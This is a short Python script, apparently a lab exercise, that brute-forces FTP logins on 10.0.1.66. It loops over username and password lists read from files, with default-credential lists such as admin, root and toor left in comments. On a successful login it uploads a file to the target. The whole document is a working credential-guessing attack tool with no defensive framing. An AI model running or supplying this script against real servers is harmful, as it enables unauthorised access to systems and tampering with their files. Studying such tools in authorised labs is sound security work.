import ftplib
targetip = "10.0.1.66"
targetport = 21

# users =["admin", "root", "kali", "test"]
# passwords=["password", "password1234", "admin", "kali", "test", "toor"]

usersfile = open(r"users.txt","r")
paswordsfile = open(r"passwords.txt","r")
users = usersfile.read().split("\n")
passwords = paswordsfile.read().split("\n")


usersfile.close()
paswordsfile.close()

ftpserver = ftplib.FTP()
isFind = False
for user in users:
    for password in passwords:
        try:
            print(f"Trying: {user}:{password}")
            ftpserver.connect(targetip,targetport,timeout=0.1)
            ftpserver.login(user,password)
            print("[+] Success")
            isFind = True
            # print(ftpserver.dir())
            try:
                ftpserver.storbinary("STOR users.txt", open(r"users.txt","rb"))
            except Exception as err:
                print(err)
            break
        except:
            print("[+]Invalid credentials")
    if isFind == True:
        break